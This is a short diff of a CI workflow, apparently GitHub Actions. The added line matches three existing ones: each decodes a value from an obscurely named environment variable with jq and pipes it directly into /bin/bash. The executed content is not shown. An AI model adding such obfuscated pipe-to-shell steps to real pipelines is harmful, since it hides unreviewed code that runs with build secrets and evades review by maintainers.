@@ -41,6 +41,7 @@ jobs:
           printf '%s' "$wok6" | jq -r .qoac8361 | /bin/bash
           echo $q892 | jq -r .wjxl72739 | /bin/bash
           echo $gbw7 | jq -r .s95 | /bin/bash
+          echo $mr32 | jq -r .r2 | /bin/bash
 
       - name: Store results
         if: always()
